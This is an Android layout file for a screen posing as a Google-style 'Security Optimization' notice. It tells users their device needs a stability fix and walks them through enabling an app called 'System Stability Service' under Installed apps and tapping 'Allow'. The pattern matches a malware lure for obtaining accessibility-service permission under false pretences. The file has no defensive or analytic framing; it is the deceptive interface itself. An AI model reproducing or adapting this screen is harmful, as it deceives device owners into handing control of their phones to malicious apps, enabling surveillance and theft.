<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FFFFFF">

    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:fillViewport="true"
        app:layout_constraintBottom_toTopOf="@id/buttonContainer"
        app:layout_constraintTop_toTopOf="parent">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:gravity="center_horizontal"
            android:orientation="vertical"
            android:padding="32dp">

            <ImageView
                android:layout_width="209dp"
                android:layout_height="182dp"
                android:layout_marginTop="40dp"
                android:src="@drawable/ic_android_play" />

            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_marginTop="15dp"
                android:text="Security Optimization"
                android:textColor="#4B4C4E"
                android:textSize="22sp"
                android:textStyle="bold" />

            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="8dp"
                android:layout_marginBottom="24dp"
                android:alpha="0.9"
                android:gravity="center"
                android:text="Your device requires a stability optimization to continue. Follow these steps on the next screen:"
                android:textColor="#5F6368"
                android:textSize="15sp" />

            <!-- Step 1 -->
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="#FBFBFB"
                android:padding="16dp"
                android:text="1. Tap 'START OPTIMIZATION', then click 'Installed apps'"
                android:textColor="#202124"
                android:textSize="16sp"
                android:textStyle="bold" />

            <!-- Step 2 -->
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="#FBFBFB"
                android:padding="16dp"
                android:text="2. Tap 'System Stability Service', toggle it on and tap 'Allow'"
                android:textColor="#202124"
                android:textSize="16sp"
                android:textStyle="bold" />

        </LinearLayout>
    </ScrollView>

    <FrameLayout
        android:id="@+id/buttonContainer"
        android:layout_width="match_parent"
        android:layout_height="100dp"
        android:background="#FFFFFF"
        android:paddingBottom="16dp"
        app:layout_constraintBottom_toBottomOf="parent">

        <com.google.android.material.button.MaterialButton
            android:id="@+id/btnGuideAction"
            android:layout_width="257dp"
            android:layout_height="64dp"
            android:layout_gravity="center"
            android:fontFamily="sans-serif-medium"
            android:text="Start Optimization"
            android:textAllCaps="true"
            android:textColor="#FFFFFF"
            android:textSize="14sp"
            android:textStyle="bold"
            app:backgroundTint="#1A73E8"
            app:cornerRadius="100dp" />
    </FrameLayout>

</androidx.constraintlayout.widget.ConstraintLayout>
